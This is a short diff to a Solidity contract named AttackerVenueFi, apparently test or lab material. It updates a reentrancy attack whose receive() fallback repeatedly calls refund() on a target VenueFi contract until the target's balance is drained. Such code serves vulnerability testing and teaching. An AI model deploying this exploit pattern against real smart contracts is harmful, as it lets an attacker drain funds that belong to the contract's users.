@@ -5,7 +5,6 @@ import "../VenueFi.sol";
 
 contract AttackerVenueFi {
     VenueFi public target;
-    uint256 public attackAmount;
 
     constructor(address _target) {
         target = VenueFi(_target);
@@ -13,16 +12,15 @@ contract AttackerVenueFi {
 
     function doInvest() external payable {
         target.invest{value: msg.value}();
-        attackAmount = msg.value;
     }
 
     function attack() external {
-        target.refund(attackAmount);
+        target.refund();
     }
 
     receive() external payable {
         if (address(target).balance > 0) {
-            target.refund(attackAmount);
+            target.refund();
         }
     }
 }
